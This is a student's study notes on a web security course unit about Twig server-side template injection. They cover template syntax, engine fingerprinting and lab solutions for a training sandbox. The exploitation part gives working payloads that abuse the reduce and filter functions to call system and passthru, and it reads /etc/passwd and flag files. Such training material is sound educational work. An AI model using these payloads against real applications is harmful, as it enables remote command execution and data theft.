This Learning Unit covers the following Learning Objectives:

1. Understand the basic syntax of Twig
2. Understand how to discover a Twig template in a black box scenario
3. Understand how to reach RCE with a Twig Template
------------
#### 11.2.1. Twig - Discovery

`Twig` is a popular templating engine for PHP. Prior to Twig's rise, PHP developers would often write inline PHP within documents.

```php
<h1><?php echo $name ?></h1>

<p>Welcome to our site!</p>

<?php 
if ($isAdmin) {
  echo "<p>You are the supreme leader and we love you</p>";
}
?>
```

This early development style left a lot to be desired. Developers often left security gaps, which could lead to attacks like XSS using inline PHP. While these types of applications still exist, with the rise of PHP frameworks like _Laravel_,[2](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/twig-discovery-and-exploitation-31307/twig-discovery-31049#fn-local_id_198-2) _Symfony_,[3](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/twig-discovery-and-exploitation-31307/twig-discovery-31049#fn-local_id_198-3) _CakePHP_,[4](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/twig-discovery-and-exploitation-31307/twig-discovery-31049#fn-local_id_198-4) and others, inline PHP applications are slowly going away.

Frameworks like the ones listed above commonly expect developers to use a _Model-View-Controller_ (MVC)[5](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/twig-discovery-and-exploitation-31307/twig-discovery-31049#fn-local_id_198-5) design pattern (or something similar). This type of design pattern pushes for separation of how the data (model) is processed (controller) and displayed (view). Because of this separation, templating engines like Twig are very popular. In fact, Twig is developed and maintained by the Symfony Framework, but it is supported by almost all other frameworks.

Now that we've covered MVC fundamentals and a bit of Twig's history, let's review the syntax of a rudimentary Twig template. We can find an example in the sandbox by visiting the /twig route on the template sandbox.

```php
<h1>{% if not admin %}sudo {% endif %}make me a sandwich, {{name|capitalize}}!</h1>
We are using Twig remotely to generate this template
```

This template can be found at `http://template-sandbox/twig`.
![[Pasted image 20241022134908.png]]
Within this template, we can find examples of a statement, expression, and static content. Let's first review the `if` statement at the beginning.

```php
{% if not admin %}sudo {% endif %}
```
This statement will first check whether the _admin_ variable is true. If the user is not an admin, the output will include "sudo". If the user is an admin, then "sudo" is not necessary. We can check the value of _admin_ by reviewing the variables.

![[Pasted image 20241022135226.png]]
In PHP, a value of 0 can be treated as a boolean value of "false".
Next, let's review the statement that prints the name.
```php
make me a sandwich, {{name|capitalize}}!
```
The _name_ variable is pushed through the _capitalize_ filter. This is one of the many filters Twig offers by default in all templates. Filters like these are what make Twig more logical than logic-less. However, we must remember that more logical templating engines are more likely to expose security gaps. We will review how to exploit this later.

Reviewing the variables, we should be able to determine what the _name_ variable is set to.
![[Pasted image 20241022135821.png]]
We'll notice the "Edvinas" name is output in this location.

Twig syntax is very similar to many other common templating engines. However, when we are attempting to inject into a template, it's essential that we know what templating engine the target is running so we can use the correct syntax.

As we become more familiar with various templating engines, this concept will make more sense. While it might seem that curly brackets could be a giveaway that the target templating engine is Twig, other templating engines might share the same delimiters. In addition, most templating engines allow developers to change the default delimiters, so we can't always base our decision off the delimiters alone.

With that in mind, let's attempt to find other indicators that the templating engine might be Twig. For example, we could compare how arithmetic is performed when two integers are provided versus when a string and an integer are provided. Let's first review the output when we multiply 5 by 5. We'll do this by creating a new statement and using the "*" character to multiply the numbers. In the template sandbox, we can edit the template by replacing the text in the upper-left pane of the page.

```http
{{5*5}}
```
![[Pasted image 20241022140012.png]]
The output here is 25, as expected. Now let's change one of the numbers to '5' instead.
![[Pasted image 20241022140043.png]]
The output again is 25. This is because PHP does not check the type of the variable and will automatically treat '5' like the number 5. We can leverage this to help us discover what templating engine is in use, since not all languages behave the same way. Later in this Learning Module, we'll work with this output using a language that is more stringent about variable types.

Another way to determine if the target is using Twig is by reading the documentation and finding unique pieces of syntax. For example, Twig supports adding a "-" character to the delimiter to trim whitespace.[6](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/twig-discovery-and-exploitation-31307/twig-discovery-31049#fn-local_id_198-6) This means if we add a couple of extra spaces, use a statement with the "-" character, and review the output, we should find that the output won't have the extra whitespaces if the target is indeed running Twig.

![[Pasted image 20241022140204.png]]

The documentation for templating engines is extremely useful in SSTI exploitation.
Go to `http://template-sandbox/twig` for the following exercises.

##### Labs
1.
`OS{DontSnapTheTwig}`
![[Pasted image 20241022140634.png]]
Input `{SECRET_STRING}` to get the flag 
![[Pasted image 20241022140602.png]]

2.

![[Pasted image 20241022141523.png]]
```twig
{% for item in SECRET_ARRAY %}
    {{ item }}
{% endfor %}
```
for all items in `SECRET_ARRAY`, print `item`
![[Pasted image 20241022141600.png]]
3.
![[Pasted image 20241022141843.png]]
`/var/www/vendor/twig/twig/src/Environment.php`
![[Pasted image 20241022141811.png]]
This didnt work
```twig
{{5*a}}
```
This did work
```twig
{{5*'a'}}
```

------------
#### 11.2.1. Twig - Exploitation
While Twig does not advertise direct access to its underlying language (PHP), it does provide several filters that might be useful for us. We'll start our review by checking if any of the filter names stand out in the documentation.[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/twig-discovery-and-exploitation-31307/twig-discovery-31049#fn-local_id_315-1)
![[Pasted image 20241022143609.png]]
Typically, filters like _currency_symbol_ and _inline_css_ don't stand out since these usually don't need to execute any function to receive a response. They may simply manipulate an integer or review a string. We're unlikely to find an execution path in these filters.

We want to review filters that have closer ties to the programming language and might accept functions to process data. For example, filters like _filter_, _join_, _map_, _reduce_, _slice_, and _sort_ stand out since they might accept functions for additional processing.

Let's open the documentation for _reduce_[2](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/twig-discovery-and-exploitation-31307/twig-exploitation-31043#fn-local_id_315-2) and read how this filter works. The documentation states:

The reduce filter iteratively reduces a sequence or a mapping to a single value using an arrow function, to reduce it to a single value.

We'll also find a documented example.
```twig
{% set numbers = [1, 2, 3] %}

{{ numbers|reduce((carry, v) => carry + v) }}
{# output 6 #}
```
The most important thing for us to notice is that this filter accepts a function (an arrow function[^ssti_arrow] in this case) that is executed by the filter. Knowing exactly what arrow functions are and how they work is less important. If we can control which function to use, we might be able to execute arbitrary PHP functions.

Reviewing the arguments, we can find some hints about how to achieve this:
```twig
Arguments

    arrow: The arrow function
    initial: The initial value
```
For now, we'll use _var_dump_ as the function and provide a random string as the argument. We also need to provide a value on the left side of the filter, so let's use an array with only a single value.
```twig
{{[0]|reduce('var_dump','Hello')}}
```
If we place this in our sandbox, we'll receive a variable dump of the string.
![[Pasted image 20241022144023.png]]
```twig
string(5) "Hello"
int(0)
```
The _var_dump_ function was executed with the "Hello" string as an argument. Let's replace this string with something that will execute system commands instead, such as the _system_[^ssti_system] function.
```twig
{{[0]|reduce('system','whoami')}}
```
![[Pasted image 20241022144133.png]]
Excellent! We can now execute commands in the Twig templating engine!
Go to` http://template-sandbox/twig` for the following exercises.

##### Labs
1.
![[Pasted image 20241022144334.png]]
```twig
{{[0]|reduce('system','cat /var/www/flag.txt')}}
```
![[Pasted image 20241022150511.png]]


2.
`OS{CrvenaJabuka}`
![[Pasted image 20241022153211.png]]
Google `hacktricks twig rce` and brings up this web page
![[Pasted image 20241022153229.png]]
try this filter and get flag
```twig
{{['id']|filter('system')}}
```
![[Pasted image 20241022153326.png]]

3.
`OS{DinoMerlin}`
![[Pasted image 20241022160238.png]]
The key word is `execute external programs` upon googling PHP documentation to `execute external programs` , this comes up witht the `passthru` function
![[Pasted image 20241022160648.png]]
Upon entering this `twig` script with the `passthru` function we get the flag
```twig
{{ ['passthru("cat $IFS/etc/passwd")']|filter('system') }}
```
![[Pasted image 20241022160808.png]]